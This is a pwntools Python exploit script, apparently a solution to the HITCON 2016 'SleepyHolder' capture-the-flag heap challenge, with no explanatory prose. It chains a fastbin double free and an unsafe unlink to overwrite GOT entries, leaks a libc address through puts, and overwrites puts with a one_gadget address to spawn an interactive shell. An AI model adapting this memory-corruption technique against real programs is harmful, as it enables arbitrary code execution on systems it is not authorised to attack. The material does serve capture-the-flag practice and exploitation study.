from pwn import *
from LibcSearcher import *
contextlog_level = 'debug'
io = process("./sleepyHolder_hitcon_2016")
elf = ELF("./sleepyHolder_hitcon_2016")
libc = ELF("./libc-2.23.so")

def keep(idx, content):
	io.sendlineafter("Renew secret\n", '1')
	io.sendlineafter("Big secret\n", str(idx))
	io.sendafter("secret: \n", content)

def wipe(idx):
	io.sendlineafter("Renew secret\n", '2')
	io.sendlineafter("Big secret\n", str(idx))

def renew(idx, content):
	io.sendlineafter("Renew secret\n", '3')
	io.sendlineafter("Big secret\n", str(idx))
	io.sendafter("secret: \n", content)

def debug():
	gdb.attach(io)
	pause()

# attack1
keep(1,b'AAAA')
keep(2,b'AAAA')
wipe(1)
keep(3,b'AAAA')
wipe(1)
small_ptr = 0x6020d0
big_ptr = 0x06020C0
payload = p64(0)+p64(0x21)
payload+= p64(small_ptr-0x18)+p64(small_ptr-0x10)
payload+= p64(0x20)
keep(1,payload)
wipe(2)

# attack2
payload = b'A'*8+p64(elf.got['free'])
payload+= b'A'*8+p64(big_ptr)
payload+= p32(1)
renew(1,payload)
renew(2,p64(elf.plt['puts']))
renew(1,p64(elf.got['puts']))
wipe(2)
puts_addr = u64(io.recvline()[:6]+b"\x00\x00")
libcbase = puts_addr-libc.symbols['puts']
print(hex(libcbase))
onegadget = [0x4525a,0xef9f4,0xf0897]

# attack 3
payload = b'A'*0x10
payload+= p64(elf.got['puts'])
renew(1,payload)
renew(1,p64(onegadget[0]+libcbase))
io.interactive()